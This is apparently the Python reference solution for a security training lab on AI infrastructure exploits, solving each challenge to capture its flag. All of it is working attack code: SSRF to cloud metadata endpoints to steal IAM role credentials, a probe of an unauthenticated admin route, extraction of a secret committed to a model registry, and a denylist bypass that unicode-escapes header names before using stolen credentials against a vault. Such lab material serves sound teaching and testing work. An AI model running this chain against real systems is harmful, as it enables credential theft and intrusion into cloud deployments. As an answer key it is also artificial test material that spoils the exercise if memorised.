"""Reference solution for Module 09 -- AI Infrastructure & Deployment Exploits.

The sealed crown-jewel chain uses only the appserver. Metadata and vault URLs
come back from the appserver's own recon and from the IMDSv2 identity document,
which is the path that still works when those addresses are link-local.
"""
from __future__ import annotations

import json
import re

import httpx


def _flag(blob) -> str | None:
    m = re.search(r"REDSEC\{[^}]+\}", json.dumps(blob) if not isinstance(blob, str) else blob)
    return m.group(0) if m else None


def _escape_key(name: str) -> str:
    """JSON \\uXXXX-escape a header name so a raw-byte denylist does not see it."""
    return "".join(f"\\u{ord(ch):04x}" for ch in name)


def _fetch(app: str, url: str, method: str = "GET", headers: dict[str, str] | None = None) -> dict:
    if headers:
        parts = [f'"{_escape_key(k)}": {json.dumps(v)}' for k, v in headers.items()]
        header_json = "{" + ", ".join(parts) + "}"
    else:
        header_json = "{}"
    body = (
        "{"
        f'"url": {json.dumps(url)}, '
        f'"method": {json.dumps(method)}, '
        f'"headers": {header_json}'
        "}"
    )
    r = httpx.post(
        f"{app}/fetch",
        content=body.encode(),
        headers={"content-type": "application/json"},
        timeout=20,
    )
    return r.json()


def solve(endpoints: dict[str, str], drop_url: str | None) -> dict:
    app = endpoints["appserver"].rstrip("/")
    flags: dict[str, str] = {}

    # metadata-ssrf: discover the internal metadata address, then SSRF to IMDSv1.
    # Use the appserver-reachable URL, not our own host view, so this works in
    # containers and on Kubernetes too.
    cfg = httpx.get(f"{app}/debug/config", timeout=10).json()
    meta = cfg["internal_endpoints"]["metadata"].rstrip("/")
    r = httpx.post(
        f"{app}/fetch",
        json={"url": f"{meta}/latest/meta-data/iam/security-credentials/role"},
        timeout=15,
    ).json()
    if f := _flag(r):
        flags["metadata-ssrf"] = f

    # open-inference-api: unauthenticated admin route.
    r = httpx.get(f"{app}/v1/admin", timeout=10).json()
    if f := _flag(r):
        flags["open-inference-api"] = f

    # registry-secrets: committed secret in a model card.
    name = httpx.get(f"{app}/registry/models", timeout=10).json()["models"][0]
    r = httpx.get(f"{app}/registry/models/{name}/MLmodel", timeout=10).json()
    if f := _flag(r):
        flags["registry-secrets"] = f

    # crown-jewel-chain (impossible / sealed): IMDSv2 through the egress guard,
    # then present the token-bound secret to the vault the identity document names.
    # Header names are unicode-escaped in the raw JSON; a literal credential
    # header is rejected, and the IMDSv1 flag is not a vault credential.
    tok = _fetch(
        app,
        f"{meta}/latest/api/token",
        "PUT",
        {"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
    )
    token = str(tok.get("body", "")).strip()
    creds_raw = _fetch(
        app,
        f"{meta}/latest/meta-data/iam/security-credentials/initrode-inference-role",
        "GET",
        {"X-aws-ec2-metadata-token": token},
    )
    creds = json.loads(creds_raw["body"])
    jewel = _fetch(
        app,
        creds["Vault"],
        "GET",
        {creds["CredentialHeader"]: creds["SecretAccessKey"]},
    )
    if f := _flag(jewel):
        flags["crown-jewel-chain"] = f

    return {"flags": flags}


if __name__ == "__main__":  # pragma: no cover
    import argparse

    ap = argparse.ArgumentParser()
    ap.add_argument("--appserver", required=True)
    a = ap.parse_args()
    print(json.dumps(solve({"appserver": a.appserver}, None), indent=2))
